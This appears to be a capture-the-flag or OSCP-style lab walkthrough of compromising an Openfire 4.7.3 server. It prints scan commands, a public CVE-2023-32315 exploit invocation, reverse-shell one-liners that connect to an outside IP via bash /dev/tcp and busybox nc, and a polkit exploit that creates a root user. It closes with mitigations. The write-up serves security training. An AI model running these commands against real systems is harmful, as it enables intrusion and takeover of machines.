## Introduction

In this walkthrough, I began by scanning the target machine and identified that ports **22**, **9090**, and **9091** were open. Navigating to port **9090**, I discovered a **web login console** for the **Openfire** application. The login page disclosed the version number as **Openfire 4.7.3**. Using this information, I located a publicly available exploit for that specific version and successfully gained unauthorized access to the system.

During post-exploitation enumeration, I inspected various directories and found that the **Openfire configuration files** contained **SMTP mail settings**. These files revealed the **root user's email credentials in plaintext**. Leveraging those credentials, I was able to escalate my privileges and gain **root access** to the machine.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version - OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

## Web

### Port 9090

Version - Jetty

Navigating to the website we are presented with login screen. I have seen the version of the application there.

### Port 9091

Same website with https.

## Exploitation

Let’s search for public exploits for this version of application.

[K3ysTr0K3R/CVE-2023-32315](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT&ved=2ahUKEwil9r-Po5SNAxVXgP0HHamRKqsQFnoECAkQAQ&usg=AOvVaw33em7bYOOa8loXvFyP88c0)

```bash
python3 CVE-2023-32315.py -u http://$IP:9090
```

Upload mentioned plugin.

Then go to `Server > Server Settings > Management Tool`. Enter the pass `123` and select `system command`:

Let’s get a reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.45.154/9090 0>&1'
```

I tried pretty much every reverse shell command but neither worked then I stumbled upon the following story, that means in worst cases we can use busybox:
[OSCP-Tip Reverse Shell with Busybox](https://duckwrites.medium.com/oscp-tip-reverse-shell-with-busybox-359d755a6383)

```bash
busybox nc 192.168.45.154 9090 -e /bin/bash
```

Get interactive shell using the following command:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")’
```

## Privilege Escalation

- **OSCP Checklist**
    - [ ]  Situational awareness
    - [ ]  Exposed Confidential Information
    - [ ]  Password Authentication Abuse
    - [ ]  Hunting Sensitive Information
    - [ ]  Sudo
    - [ ]  SUID/SGID
    - [ ]  Capabilities
    - [ ]  Cron Jobs Abuse
    - [ ]  Kernel Exploits
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles

Running linpeas.sh

This exploit creates a new privileged user with which you can escalate to root.

```bash
./polkadots -a kh4n -n kh4n -h $1$Y9XvmTAe$xZLaIiHTpEBx5QKWPcwFN. -i 20
```

From [`linpeas.sh`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) I identified web server directory `/var/lib/openfire` and investigating that directory I found that other admin have done some activities and found password there.

## Mitigation

- **Update Openfire** to the latest version, as version 4.7.3 contains known security flaws.
- **Avoid displaying application version numbers** on login pages or publicly accessible interfaces.
- **Remove sensitive credentials** from configuration files or store them securely using environment variables or encrypted vaults.
- Implement **principle of least privilege** for application-level users and mail accounts.
- Regularly audit system files for **exposed secrets or misconfigurations**.
- Enable **multi-factor authentication** (MFA) and strong password policies for web applications.
